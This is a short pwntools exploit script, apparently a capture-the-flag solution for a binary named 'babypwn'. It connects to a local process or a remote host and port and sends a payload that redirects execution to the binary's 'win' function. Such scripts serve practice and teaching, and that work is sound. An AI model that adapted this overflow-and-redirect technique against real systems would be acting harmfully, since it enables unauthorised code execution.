#!/usr/bin/env python2

from pwn import *

HOST, PORT = '68.183.158.95', 8990
BINARY = './babypwn'

elf = ELF(BINARY)

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def debug(breakpoints):
	gdbscript = ''

	for bp in breakpoints:
		gdbscript += 'b *0x{:x}\n'.format(bp)
	gdb.attach(p, gdbscript=gdbscript)

context.terminal = ['tmux', 'new-window']
context.arch = 'amd64'

p = start()
if not args.REMOTE and args.GDB:
	debug([0x00400994])

win = elf.symbols['win']
log.info('win: ' + hex(win))

payload = p64(win) + p64(0xfffffffe00000000) + '\n'*6

p.send(payload)

p.interactive()
